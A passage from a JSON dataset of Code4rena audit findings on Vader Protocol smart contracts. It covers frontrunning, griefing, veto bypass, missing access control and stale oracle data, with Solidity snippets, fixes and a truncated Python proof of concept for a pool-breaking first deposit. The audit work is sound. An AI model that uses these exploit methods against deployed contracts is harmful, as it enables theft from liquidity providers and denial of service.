      "summary": "\nThis bug report discusses a vulnerability in the VaderPoolV2 system which allows frontrunners to extract up to 100% of the value provided by Liquidity Providers (LPs). This is possible due to the pool's current set-up which does not allow users to specify a minimum number of liquidity units they will accept. As a result, frontrunners can manipulate the pool's reserves in such a way that the LP receives fewer liquidity units than they should. The attacker then returns the pool's reserves back to normal and pockets a fraction of the value which the LP meant to provide as liquidity. To mitigate this issue, it is recommended to add a user-specified minimum amount of LP tokens to mint.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/248",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1042",
      "title": "[M-23] Users Can Reset Bond Depositor’s Vesting Period",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `VaderBond.deposit()` function overwrites a depositors bond info on each call with the updated `payout` information. If any of the vesting is left unclaimed before a call to `deposit()` is made, the vesting period is reset to `terms.vestingTerm`, resulting in the bond holder having to wait again in order to claim tokens that they could previously claim.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-vader/blob/main/repo/vader-bond/contracts/VaderBond.sol#L192\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider preventing users from depositing to an existing bond holder or alternatively when a deposit is made, force the user to redeem any claimable tokens in the same function.",
      "summary": "\nThis bug report is about the `VaderBond.deposit()` function in the code-423n4/2021-11-vader repository. This function overwrites a depositor's bond info with the updated `payout` information, and if any vesting is left unclaimed before a call to `deposit()`, the vesting period is reset to `terms.vestingTerm`. This means that the bond holder has to wait again in order to claim tokens that they could previously claim. Manual code review was used to identify this bug. The recommended mitigation steps are to prevent users from depositing to an existing bond holder, or alternatively, when a deposit is made, force the user to redeem any claimable tokens in the same function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/259",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1041",
      "title": "[M-22] No way to remove GasThrottle after deployment",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nPotential DOS on swaps\n\n#### Proof of Concept\n\nBasePool and BasePoolV2 make use of a `validateGas` modifier on swaps which checks that the user's gas price is below the value returned by `_FAST_GAS_ORACLE`.\n\n<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex/utils/GasThrottle.sol#L9-L20>\n\nShould  `_FAST_GAS_ORACLE` be compromised to always return zero then all swaps will fail. There is no way to recover from this scenario.\n\n#### Recommended Mitigation Steps\n\nEither remove GasThrottle.sol entirely or allow governance to turn it off\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/256)**\n\n",
      "summary": "\nThis bug report details a potential Denial of Service (DOS) vulnerability on swaps. The vulnerability is related to the `validateGas` modifier in the BasePool and BasePoolV2 contracts, which uses the `_FAST_GAS_ORACLE` to check that the user's gas price is below a certain value. If the `_FAST_GAS_ORACLE` is compromised and returns a value of zero, then all swaps will fail and there is no way to recover from this. \n\nThe recommended mitigation steps for this vulnerability are to either remove the GasThrottle.sol contract entirely, or to allow governance to turn it off. This will help to prevent the potential DOS attack and ensure that the swaps are not affected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/256",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1040",
      "title": "[M-21] VaderPoolV2.rescue results in loss of funds rather than recoverability",
      "impact": "MEDIUM",
      "content": "_Submitted by TomFrenchBlockchain_\n\n#### Impact\n\nAny unaccounted for tokens on `VaderPoolV2` can be siphoned off by anyone\n\n#### Proof of Concept\n\n`VaderPoolV2` has a `rescue` function which allows any unaccounted for tokens to be recovered.\n\n<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/BasePoolV2.sol#L505-L517>\n\nHowever there is no access control on this function which means than should any tokens be sent to `VaderPoolV2` by accident they'll just be scooped up by flashbots rather than being recoverable by the original owner or Vader governance.\n\nThis also means that any rebasing tokens which are deposited into `VaderPoolV2` will have any rebases lost rather than being recoverable by Vader governance.\n\n#### Recommended Mitigation Steps\n\nPermission this function to only allow Vader governance to claim tokens.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/251#issuecomment-979185828):**\n > Duplicate #28\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/251#issuecomment-991464408):**\n > Not a duplicate, this issue correctly states that the function is vulnerable to front-running.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/251#issuecomment-995706258):**\n > The function is equivalent to the [Uniswap V2 rescue](https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L189-L195) function which is not classified as incorrect.\n\n\n\n",
      "summary": "\nThis bug report is about the vulnerability of the VaderPoolV2 contract, which allows anyone to siphon off any unaccounted for tokens. The Proof of Concept provided in the report explains that the `rescue` function in the contract does not have any access control, which means that any tokens sent to the contract by accident can be taken by flashbots instead of being recoverable by the original owner or Vader governance. As a result, any rebasing tokens deposited into the contract will have their rebases lost. The recommended mitigation step is to permission the function to only allow Vader governance to claim tokens.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/251",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1039",
      "title": "[M-20] Tokens with fee on transfer are not supported",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\nThere are ERC20 tokens that charge fee for every `transfer()` or `transferFrom()`, E.g `Vader` token.\n\nIn the current implementation, `BasePoolV2.sol#mint()` assumes that the received amount is the same as the transfer amount, and uses it to calculate liquidity units.\n\n<https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/dex-v2/pool/BasePoolV2.sol#L168-L229>\n\n```solidity\nfunction mint(\n    IERC20 foreignAsset,\n    uint256 nativeDeposit,\n    uint256 foreignDeposit,\n    address from,\n    address to\n)\n    external\n    override\n    nonReentrant\n    onlyRouter\n    supportedToken(foreignAsset)\n    returns (uint256 liquidity)\n{\n    (uint112 reserveNative, uint112 reserveForeign, ) = getReserves(\n        foreignAsset\n    ); // gas savings\n\n    nativeAsset.safeTransferFrom(from, address(this), nativeDeposit);\n    foreignAsset.safeTransferFrom(from, address(this), foreignDeposit);\n\n    PairInfo storage pair = pairInfo[foreignAsset];\n    uint256 totalLiquidityUnits = pair.totalSupply;\n    if (totalLiquidityUnits == 0) liquidity = nativeDeposit;\n    else\n        liquidity = VaderMath.calculateLiquidityUnits(\n            nativeDeposit,\n            reserveNative,\n            foreignDeposit,\n            reserveForeign,\n            totalLiquidityUnits\n        );\n\n    require(\n        liquidity > 0,\n        \"BasePoolV2::mint: Insufficient Liquidity Provided\"\n    );\n\n    uint256 id = positionId++;\n\n    pair.totalSupply = totalLiquidityUnits + liquidity;\n    _mint(to, id);\n\n    positions[id] = Position(\n        foreignAsset,\n        block.timestamp,\n        liquidity,\n        nativeDeposit,\n        foreignDeposit\n    );\n\n    _update(\n        foreignAsset,\n        reserveNative + nativeDeposit,\n        reserveForeign + foreignDeposit,\n        reserveNative,\n        reserveForeign\n    );\n\n    emit Mint(from, to, nativeDeposit, foreignDeposit);\n    emit PositionOpened(from, to, id, liquidity);\n}\n```\n\n#### Recommended\n\nConsider calling `balanceOf()` to get the actual balances.\n\n\n**[SamSteinGG (Vader) disagreed with severity](https://github.com/code-423n4/2021-11-vader-findings/issues/193#issuecomment-979174293):**\n > Tokens with a fee on transfer or rebasing tokens are not meant to be supported by the protocol, hence why the tokens supported are voted on by the DAO.\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/193#issuecomment-991508656):**\n > Not stated in the documentation, therefore the issue is valid.\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/193#issuecomment-995715303):**\n > A medium risk issue cannot constitute lack of documentation of a trait of the system. If the inclusion of tokens to the DEX was not privileged, the issue would be valid but it is not an open function and thus the scenario described would never unfold.\n>\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the current implementation of the `BasePoolV2.sol#mint()` function. This function assumes that the received amount is the same as the transfer amount when calculating liquidity units. This is not the case with ERC20 tokens such as Vader, which charge a fee for every `transfer()` or `transferFrom()`. As a result, the function will not calculate the correct liquidity units. To fix this issue, the code should consider calling `balanceOf()` to get the actual balances.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/193",
      "tags": [
        "Fee On Transfer"
      ],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1038",
      "title": "[M-19] Unclear TwapOracle.consult algorithm",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `TWAPOracle.consult` function is unclear to the auditor.\nIt seems to iterate through all registered pairs that share the `token` parameter (USDV or VADER) and then sums up the foreign token pair per `token` price.\nAnd divides this sum (`sumNative`) by the summed-up USD price of these foreign token pairs (`sumUSD`).\n\nI think the idea is to create some kind of average price but doing it like this does not seem to be effective because large prices are weighted a lot stronger than low prices.\n\n#### Example\nAssume there are 3 USDV pairs registered: `(ETH, DAI, USDC)`.\n\nOracle Price: USDV/ETH 4500, USDV/DAI 1, USDV/USDC 1\nPool price: USDV/ETH 4500, USDV/DAI 10, USDV/USDC 10\n\nEven though the DAI and USDC pool prices are off by 10x, the final result is `4502/4520 = 0.996017699` very close to a price of `1.0` which seems strange.\n\n## Recommended Mitigation Steps\nDocument how the algorithm works and make sure it's correct.\nResolve the `TODO`.",
      "summary": "\nThis bug report is about the `TWAPOracle.consult` function in the codebase. The auditor is unclear about how the function works and believes it is not effective as it weighs larger prices more strongly than lower prices. An example is given to illustrate this point, where the final result is close to a price of 1.0, even though the pool prices for DAI and USDC are off by 10x. The recommended mitigation steps are to document how the algorithm works and make sure it is correct, and to resolve the `TODO` in the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/173",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1037",
      "title": "[M-18] TWAPOracle.getRate does not scale the ratio",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `TWAPOracle.getRate` function simply performs an integer division to compute the rate.\n\n```solidity\nfunction getRate() public view returns (uint256 result) {\n    uint256 tUSDInUSDV = consult(USDV);\n    uint256 tUSDInVader = consult(VADER);\n    // @audit shouldn't this scale by 1e18 first? otherwise easily 0\n    result = tUSDInUSDV / tUSDInVader;\n}\n```\n\nIt should first be scaled by some value, for example, `1e18`.\n\n## Impact\nThe rate has no decimal precision and if `tUSDInVader > tUSDInUSDV`, the rate will always be zero.\n\nThe `usdvtoVader` and `vaderToUsdv` functions will return incorrect values.\n\n## Recommended Mitigation Steps\n```solidity\n// return as a rate with 18 decimals instead\nresult = tUSDInUSDV * 1e18 / tUSDInVader;\n```",
      "summary": "\nThis bug report is about the `TWAPOracle.getRate` function in Solidity. This function performs an integer division to compute the rate, which should first be scaled by some value, such as `1e18`. The impact of this is that the rate has no decimal precision and if `tUSDInVader > tUSDInUSDV`, the rate will always be zero. This means that the `usdvtoVader` and `vaderToUsdv` functions will return incorrect values. The recommended mitigation step for this bug is to return the rate with 18 decimals instead, by using the following code: `result = tUSDInUSDV * 1e18 / tUSDInVader`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/172",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1036",
      "title": "[M-17] Vests can be denied",
      "impact": "MEDIUM",
      "content": "_Submitted by cmichel_\n\nThe `LinearVesting.vestFor` function (which is called by `Converter`) reverts if there already exists a vest for the user:\n\n```solidity\n require(\n    vest[user].amount == 0,\n    \"LinearVesting::selfVest: Already a vester\"\n);\n```\n\nThere's an attack where a griefer frontruns the `vestFor` call and instead vests the smallest unit of VADER for the `user`.\nThe original transaction will then revert and the vest will be denied\n\n#### Recommended Mitigation Steps\n\nThere are several ways to mitigate this.\nThe most involved one would be to allow several separate vestings per user.\n\n**[SamSteinGG (Vader) confirmed)](https://github.com/code-423n4/2021-11-vader-findings/issues/169)** \n\n",
      "summary": "\nThis bug report is about a vulnerability in the LinearVesting.vestFor function, which is called by the Converter, that allows a griefer to frontrun the call and vest the smallest unit of VADER for the user. This would cause the original transaction to revert and the vest would be denied. To mitigate this, the most involved solution would be to allow several separate vestings per user.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/169",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1035",
      "title": "[M-16] Governor’s veto protection can be exploited",
      "impact": "MEDIUM",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `GovernorAlpha`'s council cannot veto proposals that perform a call to the contract itself.\nThis can be exploited by malicious proposal creators by appending a new call at the end of their proposal that simply calls an innocent function like `GovernorAlpha.votingDelay()`.\n\n## Impact\nThe veto procedure can easily be circumvented, making the council unable to veto.\n\n## Recommended Mitigation Steps\nThe veto check must be further restricted by specifying the actual function selector that is not allowed to be vetoed, like `changeCouncil`.",
      "summary": "\nThis bug report details an issue with the `GovernorAlpha`'s council not being able to veto proposals that call the contract itself. This could be exploited by malicious proposal creators to add a call to an innocent function like `GovernorAlpha.votingDelay()` at the end of their proposal, thus bypassing the veto procedure. The impact of this vulnerability is that the council is unable to veto. The recommended mitigation step is to further restrict the veto check by specifying the actual function selector that is not allowed to be vetoed, such as `changeCouncil`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/167",
      "tags": [],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1034",
      "title": "[M-15] Lacking Validation Of Chainlink’ Oracle Queries",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\n`TwapOracle.consult()` is missing additional validations to ensure that the round is complete and has returned a valid/expected price. The `consult()` improperly casts an `int256 price` to `uint256` without first checking the value. As a result, the variable may underflow and return an unexpected result, potentially causing further issues in other areas of the protocol that rely on this function.\n\nAdditionally, the `GasThrottle.validateGas()` modifier utilises Chainlink's `latestAnswer()` function which lacks additional checks for stale data. The `latestRoundData()` function facilitates additional checks and should be used over `latestAnswer()`.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/twap/TwapOracle.sol#L134-L150\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/utils/GasThrottle.sol#L15\nhttps://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round\n\n## Tools Used\n\nManual code review.\nChainlink best practices.\n\n## Recommended Mitigation Steps\n\nConsider validating the output of `latestRoundData()` to match the following code snippet:\n```\n     (\n        uint80 roundID,\n        int256 price,\n        ,\n        uint256 updateTime,\n        uint80 answeredInRound\n      ) = ETH_CHAINLINK.latestRoundData();\n      require(\n          answeredInRound >= roundID,\n          \"Chainlink Price Stale\"\n      );\n      require(price > 0, \"Chainlink Malfunction\");\n      require(updateTime != 0, \"Incomplete round\");\n```\n\nThis needs to be updated in `TwapOracle.consult()` and in `GasThrottle.validateGas()`. The latter instance should have the `latestAnswer()` function replaced with `latestRoundData()` in order to avoid stale data.",
      "summary": "\nA bug report has been submitted by leastwood regarding the `TwapOracle.consult()` and `GasThrottle.validateGas()` functions in the code-423n4/2021-11-vader repository. The `consult()` function improperly casts an `int256 price` to `uint256` without first checking the value, which can lead to an underflow and unexpected result. Additionally, the `GasThrottle.validateGas()` modifier uses Chainlink's `latestAnswer()` function which lacks additional checks for stale data. The recommended mitigation steps are to validate the output of `latestRoundData()` and replace `latestAnswer()` with `latestRoundData()` in `GasThrottle.validateGas()` to avoid stale data.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/151",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1033",
      "title": "[M-14] BasePool.swap() Is Callable By Anyone",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `BasePool.swap()` function differs from its implementation in `BasePoolV2.swap()` in which it lacks an `onlyRouter` modifier. This ensures that users cannot call this function directly as `VaderRouter._swap()` performs some necessary input validation which can be bypassed by directly calling `BasePool.swap()`.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/router/VaderRouter.sol#L304-L351\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L289-L379\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L261-L268\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider adding an `onlyRouter` modifier to the `BasePool.swap()` functions to ensure users cannot directly call these functions.",
      "summary": "\nThis bug report describes a vulnerability in the `BasePool.swap()` function in the code-423n4/2021-11-vader repository. This function differs from its implementation in `BasePoolV2.swap()` in that it lacks an `onlyRouter` modifier. This means that users can call this function directly, bypassing necessary input validation. The vulnerability was identified through manual code review and can be found in the provided links. To mitigate this vulnerability, consider adding an `onlyRouter` modifier to the `BasePool.swap()` functions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/149",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1032",
      "title": "[M-13] BasePool.mint() Is Callable By Anyone",
      "impact": "MEDIUM",
      "content": "## Handle\n\nleastwood\n\n\n## Vulnerability details\n\n## Impact\n\nThe `BasePool.mint()` function differs from its implementation in `BasePoolV2.mint()` in which it lacks an `onlyRouter` modifier. This ensures that users cannot call this function directly as `VaderRouter.addLiquidity()` performs some necessary input validation which can be bypassed by directly calling `BasePool.mint()`.\n\n## Proof of Concept\n\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/router/VaderRouter.sol#L123-L150\nhttps://github.com/code-423n4/2021-11-vader/blob/main/contracts/dex/pool/BasePool.sol#L149-L194\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider adding an `onlyRouter` modifier to the `BasePool.mint()` function to ensure users cannot directly call this function.",
      "summary": "\nThis bug report relates to an issue with the `BasePool.mint()` function in the VaderRouter contract. This function differs from its implementation in `BasePoolV2.mint()` in that it lacks an `onlyRouter` modifier, which means users can call the function directly and bypass the necessary input validation done by `VaderRouter.addLiquidity()`. This vulnerability was discovered through manual code review and can be mitigated by adding an `onlyRouter` modifier to the `BasePool.mint()` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/148",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1031",
      "title": "[M-12] Missing duplicate veto check",
      "impact": "MEDIUM",
      "content": "_Submitted by defsec_\n\n#### Impact\n\nOn the GovernorAlpha contract, function veto has been added. Although the function behaviour is expected, duplicate veto process has not been checked on that function.\n\n#### Proof of Concept\n\n1.  Navigate to following contract line. (<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/governance/GovernorAlpha.sol#L562>)\n\n```\n    function veto(uint256 proposalId, bool support) external onlyCouncil {\n        ProposalState _state = state(proposalId);\n        require(\n            _state == ProposalState.Active || _state == ProposalState.Pending,\n            \"GovernorAlpha::veto: Proposal can only be vetoed when active\"\n        );\n\n        Proposal storage proposal = proposals[proposalId];\n        address[] memory _targets = proposal.targets;\n        for (uint256 i = 0; i < _targets.length; i++) {\n            if (_targets[i] == address(this)) {\n                revert(\n                    \"GovernorAlpha::veto: council cannot veto on proposal having action with address(this) as target\"\n                );\n            }\n        }\n\n        VetoStatus storage _vetoStatus = proposal.vetoStatus;\n        _vetoStatus.hasBeenVetoed = true;\n        _vetoStatus.support = support;\n\n        if (support) {\n            queue(proposalId);\n        }\n\n        emit ProposalVetoed(proposalId, support);\n    }\n\n    /**\n\n```\n\n2.  The veto progress can be completed per proposal twice.\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nConsider to check if proposals vetoed before.\n\n```\nVetoStatus storage _vetoStatus = proposal.vetoStatus;\nrequire(!_vetoStatus.hasBeenVetoed, \"Vetoed before\");\n\n```\n\n**[SamSteinGG (Vader) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/137#issuecomment-974605812):**\n > Duplicate of #61\n\n**[alcueca (judge) commented](https://github.com/code-423n4/2021-11-vader-findings/issues/137#issuecomment-991038019):**\n > Not a duplicate\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the GovernorAlpha contract. The function veto has been added, but duplicate veto process has not been checked on that function. This means that the veto progress can be completed per proposal twice. To reproduce the bug, one must navigate to a certain contract line. The recommended mitigation step is to check if proposals have been vetoed before. This can be done by adding a line of code to the contract that requires that the proposal has not been vetoed before.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/137",
      "tags": [],
      "finders": [
        "defsec"
      ]
    },
    {
      "id": "1030",
      "title": "[M-11] TWAP Oracle inflexible _updatePeriod",
      "impact": "MEDIUM",
      "content": "## Handle\n\nelprofesor\n\n\n## Vulnerability details\n\n## Impact\nUpdate periods in TWAP oracles reflect risk of an asset.  Updating more frequently accurately prices an asset but increases capabilities of manipulation (which should be harder with more stable assets), whereas longer update periods prevent manipulation but does not accurately price assets (due to the time difference between updates). Volatility of an asset should be considered when calculating update periods. However, in Vader's `TwapOracle.sol` no such considerations are made, the `_updatePeriod` cannot be changed after deployment of the contract. Additionally, each asset uses the same `_updatePeriod`  which does not adequately account for the differences in risk for each asset. This could lead to price manipulation or inadequate pricing of assets.\n\n\n## Proof of Concept\n[the only chance to set `_updatePeriod`](https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/twap/TwapOracle.sol#L80)\n\n[`_updatePeriod` used in time elapsed calculation](https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/twap/TwapOracle.sol#L345)\n\n## Recommended Mitigation Steps\nAdd the following function\n\n```\nfunction setUpdatePeriod(uint256 newUpdatePeriod) external onlyOwner {\n    require(newUpdatePeriod > minimumUpdatePeriod, \"Update period must be larger than threshold\"); // Optional validation based on some risk tolerance\n    _updatePeriod = newUpdatePeriod;\n}\n```",
      "summary": "\nThis bug report concerns the `TwapOracle.sol` contract in the Vader project. The issue is that the `_updatePeriod` cannot be changed after deployment of the contract, and every asset uses the same `_updatePeriod`. This could lead to price manipulation or inadequate pricing of assets due to the time difference between updates.\n\nThe proof of concept for the bug can be found at the following locations in the project's Github repository: \n- [the only chance to set `_updatePeriod`](https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/twap/TwapOracle.sol#L80)\n- [`_updatePeriod` used in time elapsed calculation](https://github.com/code-423n4/2021-11-vader/blob/429970427b4dc65e37808d7116b9de27e395ce0c/contracts/twap/TwapOracle.sol#L345)\n\nThe recommended mitigation step is to add a new function to the `TwapOracle.sol` contract that allows the `_updatePeriod` to be changed. This function should include a validation step based on the risk tolerance of the asset.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/136",
      "tags": [],
      "finders": [
        "elprofesor"
      ]
    },
    {
      "id": "1029",
      "title": "[M-10] SHOULD CHECK RETURN DATA FROM CHAINLINK AGGREGATORS",
      "impact": "MEDIUM",
      "content": "_Submitted by defsec_\n\n#### Impact\n\nThe consult function in the contract TwapOracle.sol fetches the asset price from a Chainlink aggregator using the latestRoundData function. However, there are no checks on timeStamp, resulting in stale prices. The oracle wrapper calls out to a chainlink oracle receiving the latestRoundData(). It then checks freshness by verifying that the answer is indeed for the last known round. The returned updatedAt timestamp is not checked.\n\nIf there is a problem with chainlink starting a new round and finding consensus on the new value for the oracle (e.g. chainlink nodes abandon the oracle, chain congestion, vulnerability/attacks on the chainlink system) consumers of this contract may continue using outdated stale data (if oracles are unable to submit no new round is started)\n\n#### Proof of Concept\n\n1.  Navigate to \"<https://github.com/code-423n4/2021-11-vader/blob/607d2b9e253d59c782e921bfc2951184d3f65825/contracts/twap/TwapOracle.sol#L141>\" contract.\n\n2.  consult function does not check timestamp on the latestRoundData.\n\n#### Tools Used\n\nNone\n\n#### Recommended Mitigation Steps\n\nConsider to add checks on the return data with proper revert messages if the price is stale or the round is incomplete, for example:\n\n    (uint80 roundID, int256 price, , uint256 timeStamp, uint80 answeredInRound) = ETH_CHAINLINK.latestRoundData();\n    require(timeStamp != 0, \"...\");\n\nConsider checking the oracle responses updatedAt value after calling out to chainlinkOracle.latestRoundData() verifying that the result is within an allowed margin of freshness.\n\n- <https://docs.chain.link/docs/faq/#how-can-i-check-if-the-answer-to-a-round-is-being-carried-over-from-a-previous-round>\n\n- <https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/>\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-11-vader-findings/issues/120)**\n>The TWAP oracle module has been completely removed and redesigned from scratch as LBTwap that is subject of the new audit.\n\n",
      "summary": "\nThis bug report is about the consult function in the contract TwapOracle.sol. This function fetches the asset price from a Chainlink aggregator using the latestRoundData function. However, this function does not check the timeStamp, which results in stale prices. If there is a problem with chainlink starting a new round and finding consensus on the new value for the oracle, consumers of this contract may continue using outdated stale data. \n\nThe recommended mitigation steps to fix this bug include adding checks on the return data with proper revert messages if the price is stale or the round is incomplete. It is also recommended to check the oracle responses updatedAt value after calling out to chainlinkOracle.latestRoundData() verifying that the result is within an allowed margin of freshness.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-11-vader",
      "github_link": "https://github.com/code-423n4/2021-11-vader-findings/issues/120",
      "tags": [],
      "finders": [
        "defsec"
      ]
    },
    {
      "id": "1028",
      "title": "[M-09] The first lp provider can destroy the pool",
      "impact": "MEDIUM",
      "content": "_Submitted by jonah1005_\n\n#### Impact\n\nFirst lp provider received liquidity amount same as the nativeDeposit amount and decides the rate. If the first lp sets the pool's rate to an extreme value no one can deposit to the pool afterward. (please refer to the proof of concept section)\n\nA malicious attacker can DOS the system by back-running the `setTokenSupport` and setting the pools' price to the extreme.\nI consider this is a medium-risk issue.\n\n#### Proof of Concept\n\n```python\n\n    deposit_amount = 1000 * 10**18\n    get_token(dai, user, deposit_amount*3)\n    get_token(vader, user, deposit_amount*3)\n    dai.functions.approve(pool.address, deposit_amount*3).transact()\n    link.functions.approve(pool.address, deposit_amount*3).transact()\n\n\n    # deposit_amount = 1000 * 10**18\n\n    # # first deposit 1 wei Dai and 1 vader to the pool\n    router.functions.addLiquidity(dai.address, vader.address, 1, 10**18, user, 10**18).transact()\n    print('received liquidity', pool.functions.positions(0).call()[2])\n    # output log:\n    # 1000000000000000000\n\n    # normally deposit to the pool\n    router.functions.addLiquidity(dai.address, vader.address, deposit_amount, deposit_amount, user, 10**18).transact()\n    print('received liquidity', pool.functions.positions(1).call()[2])\n\n    # output log:\n    # 500000000000000000500000000000000000000\n\n    # no one can deposit to 